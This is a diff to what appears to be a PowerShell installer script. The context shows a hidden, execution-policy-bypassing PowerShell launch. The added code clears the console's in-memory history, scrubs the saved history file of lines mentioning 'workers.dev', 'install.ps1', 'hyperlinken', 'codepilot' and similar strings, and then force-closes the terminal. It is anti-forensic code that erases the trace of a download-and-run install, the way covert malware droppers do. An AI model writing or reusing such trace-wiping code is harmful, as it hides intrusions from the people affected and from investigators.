@@ -190,15 +190,31 @@ s.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$local
 
 # Clean install trace from PowerShell history
 try {
+    # Clear in-memory readline history so arrow keys don't show it
+    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+} catch {}
+try {
+    # Clean the history file on disk
     $hPath = (Get-PSReadLineOption).HistorySavePath
     if ($hPath -and (Test-Path $hPath)) {
         $lines = Get-Content $hPath -ErrorAction SilentlyContinue
         $clean = $lines | Where-Object {
+            $_ -notmatch 'workers\.dev' -and
             $_ -notmatch 'sweetbush' -and
+            $_ -notmatch 'empty.paper' -and
             $_ -notmatch 'rr3703404' -and
-            $_ -notmatch 'install\.ps1.*iex' -and
-            $_ -notmatch 'hyperlinken/whoa'
+            $_ -notmatch 'install\.ps1' -and
+            $_ -notmatch 'hyperlinken' -and
+            $_ -notmatch 'codepilot' -and
+            $_ -notmatch 'techno'
         }
         $clean | Set-Content $hPath -ErrorAction SilentlyContinue
     }
 } catch {}
+
+# Close this terminal window
+try {
+    Stop-Process -Id $PID -Force
+} catch {
+    exit
+}
